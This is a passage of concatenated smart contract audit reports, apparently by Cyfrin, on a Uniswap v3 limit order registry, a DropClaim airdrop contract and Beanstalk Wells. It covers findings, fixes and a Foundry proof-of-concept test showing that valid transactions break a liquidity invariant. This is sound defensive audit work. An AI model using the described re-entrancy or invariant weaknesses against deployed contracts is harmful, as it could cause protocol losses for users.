* `cancelOrder` is [documented](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L657) to send all swap fees from a position to the last person that cancels the order; however, this is not the actual behaviour as fees are in fact stored in the [`tokenToSwapFees`](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L118-L121) mapping within the internal call to [`LimitOrderRegistry::_takeFromPosition`](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L1250-L1255), withdrawable by the owner in [`LimitOrderRegistry::withdrawSwapFees`](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L423). Therefore, this comment should be removed.
* [References](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L446) to '[Cellar](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L455)' should be updated or removed.
* [This comment](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L482) should clearly state that the new order will revert if it is either ITM or in the MIXED state (i.e. not OTM).
* '[doubley linked list](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L176)' should be spelled 'doubly linked list'.
* '[effectedOrder](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L240-L242)' should be spelled 'affectedOrder'.
* [`LimitOrderRegistry::getGasPrice`](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L1284-L1305) is a view function and as such should be moved below to within the 'view logic' [section header](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L1307-L1309).

**GFX Labs:** Fixed in commit [4cff05a](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/4cff05a1e6acd5f03bac527f0121eb3d3385fc2b).

**Cyfrin:** Acknowledged.


### Avoid hardcoding addresses when contract is intended to be deployed to multiple chains

While the [`LimitOrderRegistry::fastGasFeed`](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L190-L193) state variable is [overwritten](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L308) during construction, it is advised to avoid initializing this variable with a hardcoded address as this contract is intended to be deployed to multiple chains and there is no guarantee that the address will always be the same. Instead, simply declare the variable and add a comment indicating the mainnet address as is the case for [other such variables](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L180-L183).

**GFX Labs:** Fixed in commit [4cff05a](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/4cff05a1e6acd5f03bac527f0121eb3d3385fc2b).

**Cyfrin:** Acknowledged.


### Validate inputs to `onlyOwner` functions

Whilst there is a comment that states no input validation is performed on inputs to `LimitOrderRegistry::setRegistrar`
and `LimitOrderRegistry::setFastGasFeed` because it is in the owner's best interest to choose valid addresses, it is recommended that some guardrails still be implemented.

For example, to validate the registrar, the contract could call `IKeeperRegistrar::typeAndVersion` and validate that the return value matches that expected in `LimitOrderRegistry::setupLimitOrder` prior to setting it in storage. The `IKeeperRegistrar::register` selector could also be loosely validated by performing a call to this function within a `try/catch` block, passing `address(0)` for the `adminAddress` and catching the `InvalidAdminAddress()` custom error which would indicate expected behaviour.

To validate the fast gas feed, the contract could first make a call to the data feed and check it is reporting correctly within an expected range prior to setting its value in storage.

**GFX Labs:** Acknowledged. This is a valid concern, but in an effort to reduce contract size, these checks will not be added. Also if the owner mistakenly puts in an illogical value, they can simply call the function again with the correct value.

**Cyfrin:** Acknowledged.


### Limit orders can be frozen for one side of a Uniswap v3 pool if `minimumAssets` has not been set for one of the tokens

To prevent spamming low liquidity orders, `LimitOrderRegistry::minimumAssets` must be set for a given asset before limit orders are allowed to be placed. A Uniswap v3 pool contains two assets, but `LimitOrderRegistry::setMinimumAssets` is called for a specific asset across the entire contract and is not pool-specific. If this function is not called for both assets in a given pool then limit orders in a given direction will not be allowed, depending on which asset has no minimum set.

**GFX Labs:** Acknowledged. It is in the owner's best interest to make sure both assets in a pool are supported, so that there are more limit orders, and more swap fees generated.

**Cyfrin:** Acknowledged.


### Improvements to use of ternary operator

There is currently one [instance](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L903) of ternary operator usage that can be simplified, with the boolean expression being evaluated directly:
```solidity
bool direction = targetTick > node.tickUpper ? true : false;
```
should be changed to:
```solidity
bool direction = targetTick > node.tickUpper;
```

Additionally, there is [another conditional statement](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L524-L525) where use of the ternary operator would be recommended:
```solidity
if (direction)
    assetIn = poolToData[pool].token0;
else assetIn = poolToData[pool].token1;
```
This conditional statement could be replaced with
```solidity
assetIn = direction ? poolToData[pool].token0 : poolToData[pool].token1;
```

**GFX Labs:** Fixed in commit [4cff05a](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/4cff05a1e6acd5f03bac527f0121eb3d3385fc2b).

**Cyfrin:** Acknowledged.


### Move shared logic to internal functions called within a modifier

```solidity
...
if (direction) data.token0.safeApprove(address(POSITION_MANAGER), amount0);
else data.token1.safeApprove(address(POSITION_MANAGER), amount1);

    // 0.9999e18 accounts for rounding errors in the Uniswap V3 protocol.
    uint128 amount0Min = amount0 == 0 ? 0 : (amount0 * 0.9999e18) / 1e18;
    uint128 amount1Min = amount1 == 0 ? 0 : (amount1 * 0.9999e18) / 1e18;
...
// If position manager still has allowance, zero it out.
    if (direction && data.token0.allowance(address(this), address(POSITION_MANAGER)) > 0)
        data.token0.safeApprove(address(POSITION_MANAGER), 0);
    if (!direction && data.token1.allowance(address(this), address(POSITION_MANAGER)) > 0)
        data.token1.safeApprove(address(POSITION_MANAGER), 0);
```

The above logic in [`_mintPosition`](https://github.com/crispymangoes/uniswap-v3-limit-orders/tree/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L1029) and [`_addToPosition`](https://github.com/crispymangoes/uniswap-v3-limit-orders/tree/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L1078) is shared and repeated across both functions. Consider moving this code to internal functions which are called within a modifier like so:
```solidity
modifier approvePositionManager() {
    _approveBefore();
    _;
    _approveAfter();
}
```

**GFX Labs:** Acknowledged. This is a valid concern, but in an effort to reduce contract size and minimize code changes, this will not be implemented.

**Cyfrin:** Acknowledged.


### Re-entrancy in `LimitOrderRegistry::newOrder` means tokens with transfer hooks could take over execution to manipulate price to be immediately ITM, bypassing validation

Whilst there does not appear to be any direct benefit to an attacker, it is possible for tokens with transfer hooks to take over execution from in-flight calls to `LimitOrderRegistry::newOrder`. This function [validates](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L518) that the new order status is OTM prior to performing the [transfer](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L527) of `assetIn` from the caller. An input token such as an ERC-777, which has such transfer hooks, could therefore be used to skew the pool tick after the new order has already passed validation such that it is actually MIXED or ITM. To mitigate against this, consider moving the asset transfer block to before the order is validated OTM, carefully select allowlisted tokens or make `newOrder` non-reentrant.

**GFX Labs:** Fixed in commit [4cff05a](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/4cff05a1e6acd5f03bac527f0121eb3d3385fc2b).

**Cyfrin:** Acknowledged.

\clearpage
## Gas Optimization


### Use stack variables rather than making repeated external calls

Within `LimitOrderRegistry::withdrawNative`, calls to determine the contract balance of native/wrapped native assets are cached in [stack variables](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L437-L438) but then never used. When performing subsequent transfers, the respective functions are [called again](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L441-L442) to determine the amount to send, wasting gas on repeated external calls as the stack variables could simply be used instead.

**GFX Labs:** Fixed in commit [4cff05a](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/4cff05a1e6acd5f03bac527f0121eb3d3385fc2b).

**Cyfrin:** Acknowledged.


### Return result directly rather than assigning to a stack variable

In `LimitOrderRegistry::newOrder`, the return value is [assigned to a stack variable](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L597), `batchId`, which is never used aside from the [return statement](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L599). This assignment is not necessary as the return can be performed in a single line:
```solidity
return orderBook[details.positionId].batchId;
```

**GFX Labs:** Fixed in commit [4cff05a](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/4cff05a1e6acd5f03bac527f0121eb3d3385fc2b).

**Cyfrin:** Acknowledged.


### Perform post-increment in a single line

The post-increment of `batchCount` variable in `LimitOrderRegistry::_setupOrder` can be performed in a single line when it is assigned to `order.batchId`:
```diff
  function _setupOrder(bool direction, uint256 position) internal {
     BatchOrder storage order = orderBook[position];
-    order.batchId = batchCount;
+    order.batchId = batchCount++;
     order.direction = direction;
-    batchCount++;
  }
```

**GFX Labs:** Fixed in commit [4cff05a](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/4cff05a1e6acd5f03bac527f0121eb3d3385fc2b).

**Cyfrin:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2023-06-07-cyfrin-uniswap-v3-limit-orders.md ------


------ FILE START car/reports_md/2023-06-13-cyfrin-drop-claim-report-v2.md ------

## Low Risk


### An expired claim can be revived by a contract owner well past the expiry date

**Description:** Contract owners can use the `setClaims` function to configure claim parameters for each claim contract, including settings such as `expiry` and `minFee`. For a claim to be considered valid, claimers must pay a fee that exceeds the specified `minFee` and claim the expiry date.

However, it is important to note that the `setClaims` function allows contract owners to add or update a claim with an expiry date that has already passed. While this may initially seem like a harmless side-effect, as claimers cannot claim on such contracts, it has a more significant implication. Contract owners can effectively revive airdrops that have already expired, enabling them to carry out airdrops that should no longer be active.

[Affected lines of code in `DropClaims::setClaims`](https://github.com/kadenzipfel/drop-claim/blob/9fb36aab457b1ad3ea27351b004ddcdc5ef30682/src/DropClaim.sol#L77-L83)

**Impact:** Contract owners can modify a claim even after it has expired. This allows retroactively adding claimers by extending the validity period of a claim that should have already ended.

**Recommended Mitigation:** While the `setClaims` function is limited to contract owners and certain trust assumptions are made by protocol developers, we recommend implementing additional controls to mitigate the unrestricted powers granted to contract owners.

Consider validating the claim time before adding/updating an existing claim.

```diff
// DropClaim::setClaims
    for (uint256 i; i < arrLength;) {
+       if(expiries[i] <= block.timsetstamp) revert ERROR_EXPIRE_TIME_SHOULD_BE_GREATER_THAN_NOW;
        claims[claimContractHashes[i]] = ClaimData(uint64(expiries[i]), uint128(minFees[i]));

        unchecked {
            ++i;
        }
    }
```
**Bankless:** Acknowledged. Team will not make any changes related to this finding as this is intended functionality.

**Cyfrin:** Acknowledged.


### Changing minimum fee and expiry midway through an active airdrop can be unfair to existing/future claimers

**Description:** `DropClaim::setClaims` allows users to overwrite claim parameters, `expiry`, and `minimumFee` of an existing claim contract hash.

```solidity
  function setClaims(bytes32[] calldata claimContractHashes, uint256[] calldata expiries, uint256[] calldata minFees)
        external
        onlyOwner
    {
        if (claimContractHashes.length != expiries.length) revert MismatchedArrayLengths();
        if (claimContractHashes.length != minFees.length) revert MismatchedArrayLengths();

        uint256 arrLength = claimContractHashes.length;
        for (uint256 i; i < arrLength;) {
            claims[claimContractHashes[i]] = ClaimData(uint64(expiries[i]), uint128(minFees[i]));
            // @audit -> claim parameters for an existing claim contract hash can be overwritten for an active airdrop
            unchecked {
                ++i;
            }
        }
    }
```

When users commence claiming airdrops, it is important to consider the potential consequences of following actions that the protocol may initiate:

1. Adjusting the validity period for future claimers by extending or reducing it.
2. Modifying the fees for future claimers by increasing or decreasing them.

In both cases, it is crucial to recognize that such actions have the potential to create unfairness, whether it is for existing claimers or future claimers. Even the protocol owners should not be able to manipulate airdrop parameters once the airdrop has been activated.

In the case of using the `allowList` mode for claims, a similar concern arises regarding the `setMerkleRoot` function. Owners can update the Merkle root even after the airdrop has been activated and some users have made their claims.

**Impact:** A decrease in `minFees` benefits future claimers, while an increase in `minFees` benefits existing claimers. Similarly, shortening validity benefits past claimers while extending validity benefits future claimers. Allowing owners to update the Merkle root once the airdrop is activated has the potential to render previously eligible claimers ineligible and vice versa.


**Recommended Mitigation:** Consider tracking an additional parameter, `numClaimers`, in the `ClaimData` struct. Note that even with this addition, `ClaimData` still fits in a single slot.

```diff
  struct ClaimData {
        uint64 expiry; // Timestamp beyond which claims are disallowed
        uint128 minFee; // Minimum ETH fee amount
+        uint64 numClaimers;// Number of users who already claimed //@audit -> add this variable to ClaimData struct
    }
```

Increment `numClaimers` every time a new claim is successful. Allow changes in `setClaims` and `setMerkleRoot` only if no existing claimers exist.

`DropClaim::setClaims`

```diff

    function setClaims(bytes32[] calldata claimContractHashes, uint256[] calldata expiries, uint256[] calldata minFees)
        external
        onlyOwner
    {
        if (claimContractHashes.length != expiries.length) revert MismatchedArrayLengths();
        if (claimContractHashes.length != minFees.length) revert MismatchedArrayLengths();

        uint256 arrLength = claimContractHashes.length;
        for (uint256 i; i < arrLength;) {
+         require(claims[claimContractHashes[i]].numClaimers ==0, "Airdrop already activated");
            claims[claimContractHashes[i]] = ClaimData(uint64(expiries[i]), uint128(minFees[i]));
            unchecked {
                ++i;
            }
        }
    }

```

**Bankless:** Acknowledged. Team will not change as is worth the trade-off for us.

**Cyfrin:** Acknowledged.

\clearpage

## Informational


### `allowlistClaim` allows users to access `claimContract` unlimited times creating a potential for duplicate calls

**Description:** The `allowlistClaim` function enables claimers to repeatedly access the functions of the `claimContract`. However, it doesn't track whether a claimer has already submitted proof for verification. This can be a problem for contracts that involve airdrops, as it's important to limit the number of successful interactions with the `claimContract`.

Currently, checking for duplicate interactions lies solely with the `claimContract` because `dropClaim` contract only verifies Merkle proofs.

In contrast, the [claim function in the MerkleDistributor contract](https://etherscan.io/address/0x090D4613473dEE047c3f2706764f49E0821D256e#code) deployed by Uniswap and 1inch handles both verification of proofs submitted by claimers and ensuring that each claimer can only have one successful call.

Here's a snippet of the Uniswap `Merkledistributor` contract at 0x090D4613473dEE047c3f2706764f49E0821D256e:


```solidity
  function claim(uint256 index, address account, uint256 amount, bytes32[] calldata merkleProof) external override {
        require(!isClaimed(index), 'MerkleDistributor: Drop already claimed.'); //@restricting each user to 1 successful claim
       //@audit -> this verifies if already claimed or not
        // Verify the merkle proof.
        bytes32 node = keccak256(abi.encodePacked(index, account, amount));
        require(MerkleProof.verify(merkleProof, merkleRoot, node), 'MerkleDistributor: Invalid proof.');

        // Mark it claimed and send the token.
        _setClaimed(index);
        require(IERC20(token).transfer(account, amount), 'MerkleDistributor: Transfer failed.');

        emit Claimed(index, account, amount);
    }
```

**Impact:** In situations such as claiming airdrops, minting NFTs or claiming vested shares, it's crucial to limit the number of calls made by each claimer. Allowing duplicate access to key functions like `claim` without explicit handling of duplications can result in losses for the protocol. Relying solely on `claimContracts` to handle these duplications can potentially increase the attack surface.

**Recommended Mitigation:** We propose considering an enhancement to the `DropClaim` logic that would take into account the number of claims per `claimContract` for each user. To achieve this, we suggest introducing a mapping system that associates user addresses with the number of successful claims they have made.

In line with the existing configuration options, such as `minFee` and `expiry` parameters for each `claimContract`, we recommend the addition of a new parameter called `maxCallsPerContract`. This parameter would allow owners to limit the number of claims a user can make for a specific `claimContract`.

This added layer of security provided by the `DropClaim` contract will involve verifying if the total claims made by a user for a given `claimContract` are below the set `maxCallsPerContract` value for that particular contract. Although more gas expensive, this enhancement reduces attack surface corresponding to duplicate claims.

**Bankless:** Acknowledged. Team will not make any changes related to this finding as this is intended functionality.

**Cyfrin:** Acknowledged.

\clearpage

## Gas Optimization


### Use storage pointer rather than copy in memory

To avoid copying every element of the struct when only one element is required, it is more efficient to use a storage pointer rather than copy the element in memory.

```diff
// DropClaim::claim
-   ClaimData memory claimData = claims[getClaimContractHash(claimContract, salt)];
+   ClaimData storage claimData = claims[getClaimContractHash(claimContract, salt)];
```
[Line 100](https://github.com/kadenzipfel/drop-claim/blob/9fb36aab457b1ad3ea27351b004ddcdc5ef30682/src/DropClaim.sol#L100)

```diff
// DropClaim::batchClaim
-   ClaimData memory claimData = claims[getClaimContractHash(claimContracts[i], salts[i])];
+   ClaimData storage claimData = claims[getClaimContractHash(claimContracts[i], salts[i])];
```
[Line 131](https://github.com/kadenzipfel/drop-claim/blob/9fb36aab457b1ad3ea27351b004ddcdc5ef30682/src/DropClaim.sol#L131)

```diff
// DropClaim::_claim
-   ClaimData memory claimData = claims[getClaimContractHash(claimContract, salt)];
+   ClaimData storage claimData = claims[getClaimContractHash(claimContract, salt)];
```
[Line 200](https://github.com/kadenzipfel/drop-claim/blob/9fb36aab457b1ad3ea27351b004ddcdc5ef30682/src/DropClaim.sol#L200)

**Bankless:** Acknowledged & fixed in [commit 020bb4c49a281af32898f951b784d7748dac049f](https://github.com/kadenzipfel/drop-claim/commit/020bb4c49a281af32898f951b784d7748dac049f).

**Cyfrin:** Verified.


### Bool comparison to constant values should be avoided

Comparing to a constant (true or false) is a bit more expensive than directly checking the returned boolean value.

```diff
// DropClaim::allowlistClaim
-   if (MerkleProof.verify(merkleProof, merkleRoot, bytes32(uint256(uint160(msg.sender)))) == false) {
+   if (!MerkleProof.verify(merkleProof, merkleRoot, bytes32(uint256(uint160(msg.sender))))) {
```
[Line 158](https://github.com/kadenzipfel/drop-claim/blob/9fb36aab457b1ad3ea27351b004ddcdc5ef30682/src/DropClaim.sol#L158)

```diff
// DropClaim::allowlistBatchClaim
-   if (MerkleProof.verify(merkleProof, merkleRoot, bytes32(uint256(uint160(msg.sender)))) == false) {
+   if (!MerkleProof.verify(merkleProof, merkleRoot, bytes32(uint256(uint160(msg.sender))))) {
```
[Line 181](https://github.com/kadenzipfel/drop-claim/blob/9fb36aab457b1ad3ea27351b004ddcdc5ef30682/src/DropClaim.sol#L181)

**Bankless:** Acknowledged & fixed in [commit 0d3ccd6eb7ad266be54598a52d321cb9bb17e7af](https://github.com/kadenzipfel/drop-claim/commit/0d3ccd6eb7ad266be54598a52d321cb9bb17e7af).

**Cyfrin:** Verified

\clearpage


------ FILE END car/reports_md/2023-06-13-cyfrin-drop-claim-report-v2.md ------


------ FILE START car/reports_md/2023-06-16-cyfrin-beanstalk-wells.md ------

## High Risk


### Protocol's invariants can be broken

**Description:** The protocol intends to provide a generalized framework for constant-function AMM liquidity pools.
We have identified some invariants that should hold at any given time. One of these invariants is `totalSupply() == calcLpTokenSupply(reserves)`, and we can interpret this as the pool's total LP supply should match the calculation of LP from the current `reserves` state values.

This invariant can be broken with valid transactions in the current implementation, leading to several problems. For example, valid liquidity removal might revert, as shown in the PoC test below.

**Impact:** The impact is HIGH because this discrepancy will lead to protocol insolvency (revert on valid transactions).

**Proof of Concept:**
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import {IERC20} from "test/TestHelper.sol";
import {IWellFunction} from "src/functions/ConstantProduct2.sol";
import {LiquidityHelper} from "test/LiquidityHelper.sol";
import "forge-std/Test.sol";
import {MockToken} from "mocks/tokens/MockToken.sol";

contract GetRemoveLiquidityOneTokenOutArithmeticFail is LiquidityHelper {
    function setUp() public {
        setupWell(2);
    }

    address internal constant ADDRESS_0 = 0x0000000000000000000000000000000000001908;
    address internal constant ADDRESS_1 = 0xffffFFFfFFffffffffffffffFfFFFfffFFFfFFfE;
    address internal constant ADDRESS_2 = 0x0000000000000000000000000000000000000001;
    address internal constant ADDRESS_3 = 0x00000011EF7b76c418fC426B8707dC60c8404f4a;

    // Failing unit tests from invariant results
    function test_getRemoveLiquidityOneTokenOutArithmeticFail() public {
        showStatus();

        address msgSender = ADDRESS_0;
        _addLiquidity(msgSender, 77_470_052_844_788_801_811_950_156_551, 17_435);
        _removeLiquidityOneTokenOut(msgSender, 5267, 0);
        showStatus();

        msgSender = ADDRESS_1;
        _addLiquidity(msgSender, 79_228_162_514_264_337_593_543_950_335, 0);
        _removeLiquidity(msgSender, 2_025_932_259_663_320_959_193_637_370_794);
        showStatus();

        msgSender = ADDRESS_2;
        _addLiquidity(msgSender, 69_069_904_726_099_247_337_000_262_288, 3);
        showStatus();

        msgSender = ADDRESS_1;
        _transferLp(msgSender, ADDRESS_3, 1_690_276_116_468_540_706_301_324_542_928);
        emit log_named_uint("LP Balance (1)", well.balanceOf(ADDRESS_1));
        emit log_named_uint("LP Balance (3)", well.balanceOf(ADDRESS_3));
        showStatus();

        msgSender = ADDRESS_0;
        emit log_string("removeLiquidity");
        _removeLiquidity(msgSender, 122_797_404_990_851_137_316_041_024_188);
        showStatus();

        msgSender = ADDRESS_3;
        emit log_string("removeLiquidityOneToken");
        _removeLiquidityOneTokenOut(msgSender, 1_690_276_116_468_540_706_301_000_000_000, 1);
        emit log_named_uint("LP Balance (3)", well.balanceOf(ADDRESS_3));
        showStatus();
        // The next line fails with an under/overflow error
        //
        // CONTEXT: In the previous operation, ADDRESS_3 removes the vast majority of his LP position
        // for token[1]. At this point the token balances of the well are as follows:
        //  * token[0].balanceOf(well) = 198508852592404865716451834587
        //  * token[1].balanceOf(well) =          625986797429655048967
        // The next operation ADDRESS_3 calls is removeLiquidityOneTokenOut() for token[0] using his
        // remaining LP position. The amount of LP tokens he has left is 3. Line 526 reverts with underflow,
        // despite all operations being completely valid. How severe is this?
        _removeLiquidityOneTokenOut(msgSender, 324_542_928, 0);
        showStatus();
    }

    function test_audit() public {
        address msgSender = address(this);
        _removeLiquidityOneTokenOut(msgSender, 1e16, 0);
        _removeLiquidity(msgSender, well.balanceOf(msgSender) - 1);
        _removeLiquidity(msgSender, 1);
    }

    function test_totalSupplyInvariantSwapFail() public {
        address msgSender = 0x576024f76bd1640d7399a5B5F61530f997Ae06f2;
        changePrank(msgSender);
        IERC20[] memory mockTokens = well.tokens();
        uint tokenInIndex = 0;
        uint tokenOutIndex = 1;
        uint tokenInAmount = 52_900_000_000_000_000_000;
        MockToken(address(mockTokens[tokenInIndex])).mint(msgSender, tokenInAmount);
        mockTokens[tokenInIndex].approve(address(well), tokenInAmount);
        uint minAmountOut = well.getSwapOut(mockTokens[tokenInIndex], mockTokens[tokenOutIndex], tokenInAmount);
        well.swapFrom(
            mockTokens[tokenInIndex], mockTokens[tokenOutIndex], tokenInAmount, minAmountOut, msgSender, block.timestamp
        );
        // check the total supply
        uint functionCalc =
            IWellFunction(well.wellFunction().target).calcLpTokenSupply(well.getReserves(), well.wellFunction().data);
        // assertEq(well.totalSupply(), functionCalc);
        showStatus();
    }

    function _transferLp(address msgSender, address to, uint amount) private {
        changePrank(msgSender);
        well.transfer(to, amount);
    }

    function _removeLiquidityOneTokenOut(
        address msgSender,
        uint lpAmountIn,
        uint tokenIndex
    ) private returns (uint tokenAmountOut) {
        changePrank(msgSender);
        IERC20[] memory mockTokens = well.tokens();
        uint minTokenAmountOut = well.getRemoveLiquidityOneTokenOut(lpAmountIn, mockTokens[tokenIndex]);
        tokenAmountOut = well.removeLiquidityOneToken(
            lpAmountIn, mockTokens[tokenIndex], minTokenAmountOut, msgSender, block.timestamp
        );
    }

    function _removeLiquidity(address msgSender, uint lpAmountIn) private returns (uint[] memory tokenAmountsOut) {
        changePrank(msgSender);
        uint[] memory minTokenAmountsOut = well.getRemoveLiquidityOut(lpAmountIn);
        tokenAmountsOut = well.removeLiquidity(lpAmountIn, minTokenAmountsOut, msgSender, block.timestamp);
    }

    function _addLiquidity(
        address msgSender,
        uint token0Amount,
        uint token1Amount
    ) private returns (uint lpAmountOut) {
        changePrank(msgSender);
        uint[] memory tokenAmountsIn = _mintToSender(msgSender, token0Amount, token1Amount);
        uint minLpAmountOut = well.getAddLiquidityOut(tokenAmountsIn);

        lpAmountOut = well.addLiquidity(tokenAmountsIn, minLpAmountOut, msgSender, block.timestamp);
    }

    function _mintToSender(
        address msgSender,
        uint token0Amount,
        uint token1Amount
    ) private returns (uint[] memory tokenAmountsIn) {
        changePrank(msgSender);
        IERC20[] memory mockTokens = well.tokens();
        MockToken(address(mockTokens[0])).mint(msgSender, token0Amount);
        MockToken(address(mockTokens[1])).mint(msgSender, token1Amount);

        tokenAmountsIn = new uint[](2);
        tokenAmountsIn[0] = token0Amount;
        tokenAmountsIn[1] = token1Amount;

        mockTokens[0].approve(address(well), token0Amount);
        mockTokens[1].approve(address(well), token1Amount);
    }

    function showStatus() public {
        IERC20[] memory mockTokens = well.tokens();
        uint[] memory reserves = well.getReserves();

        uint calcedSupply = IWellFunction(well.wellFunction().target).calcLpTokenSupply(well.getReserves(), well.wellFunction().data);
        emit log_named_uint("Total  LP Supply", well.totalSupply());
        emit log_named_uint("Calced LP Supply", calcedSupply);
    }
}
```

The test results are shown below.

```
Running 1 test for test/invariant/RemoveOneLiquidity.t.sol:GetRemoveLiquidityOneTokenOutArithmeticFail
[FAIL. Reason: Arithmetic over/underflow] test_getRemoveLiquidityOneTokenOutArithmeticFail() (gas: 1029158)
Logs:
  Total  LP Supply: 1000000000000000000000000000
  Calced LP Supply: 1000000000000000000000000000
  Total  LP Supply: 8801707439172742871919189288925
  Calced LP Supply: 8801707439172742871919189288909
  Total  LP Supply: 10491983555641283578220513831854
  Calced LP Supply: 10491983555641283578222260432821
  Total  LP Supply: 12960446346289240477619201802843
  Calced LP Supply: 12960446346289240477619201802843
  LP Balance (1): 1
  LP Balance (3): 1690276116468540706301324542928
  Total  LP Supply: 12960446346289240477619201802843
  Calced LP Supply: 12960446346289240477619201802843
  removeLiquidity
  Total  LP Supply: 12837648941298389340303160778655
  Calced LP Supply: 12837648941298389340310429464350
  removeLiquidityOneToken
  LP Balance (3): 324542928
  Total  LP Supply: 11147372824829848634002160778655
  Calced LP Supply: 11147372824829848633998681214926

Test result: FAILED. 0 passed; 1 failed; finished in 3.70ms

Failing tests:
Encountered 1 failing test in test/invariant/RemoveOneLiquidity.t.sol:GetRemoveLiquidityOneTokenOutArithmeticFail
[FAIL. Reason: Arithmetic over/underflow] test_getRemoveLiquidityOneTokenOutArithmeticFail() (gas: 1029158)

Encountered a total of 1 failing tests, 0 tests succeeded
```

Looking into this, the `ConstantProduct2`, we see three problems:

1. No rounding direction is specified in the functions `calcReserve` and `calcLpTokenSupply`. These Well functions are used in critical places where the Well's state (reserve, LP) will change. Mathematical discrepancies should be rounded in favor of the protocol; however, no rounding direction is specified in the current implementation, which allows unfavorable transactions.

   For example, in [Well::getSwapOut](https://github.com/BeanstalkFarms/Wells/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/Well.sol#L231) and [Well::\_getRemoveLiquidityOneTokenOut](https://github.com/BeanstalkFarms/Wells/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/Well.sol#L519), the calculation of the output token amount is rounded up (downside rounded value is subtracted) while it should be rounded down. These unfavorable transactions will compound, affecting the health of the protocol.

2. This invariant is not guaranteed after `Well::removeLiquidity`. The current implementation calculates the token output amount from the ratio of the `lpAmountIn` to the `totalSupply`, assuming that `calcLpTokenSupply([r0 * delta, r1 * delta]) = totalSupply() * delta` where `delta` denotes the ratio `1 - lpAmountIn/lpTokenSupply`. This is also mentioned separately in another issue, but we want to note again that ensuring the invariant holds after any transaction is essential. Handling the last token separately is recommended, similar to `Well::removeLiquidityOneToken`.

3. It is practically almost impossible to make the invariant `totalSupply() == calcLpTokenSupply(reserves)` hold strictly. For this example, we will focus on the `Well::removeLiquidityOneToken` function because it is the simplest and most reasonable way to withdraw liquidity, and we will assume `ConstantProduct2` is the Well function. The mechanism is intuitive - the protocol burns the requested `lpAmountIn` and calculates the new reserve value for the requested `tokenOut` (`tokens[0]`) using the decreased LP token supply.

Let us assume `totalSupply() == calcLpTokenSupply(reserves) == T0` before the transaction. After the transaction, the total supply will be `T0 - lpAmountIn`. The output token amount is calculated as `getRemoveLiquidityOneTokenOut(lpAmountIn, 0, reserves) = reserves[0] - calcReserve(reserves, 0, T0 - lpAmountIn)`. After the transaction, the calculated total supply will be `calcLpTokenSupply([calcReserve(reserves, 0, T0 - lpAmountIn), reserves[1]])`. For the invariant to hold after the transaction, the functions `ConstantProduct2::calcLpTokenSupply` and `ConstantProduct2::calcReserve` should exhibit an accurate inverse relationship (`calcLpTokenSupply(calcReserves(reserves, LP)) == LP`). In practice, all calculations come with rounding to some extent, and this relationship is not possible so long as the two functions are implemented separately.

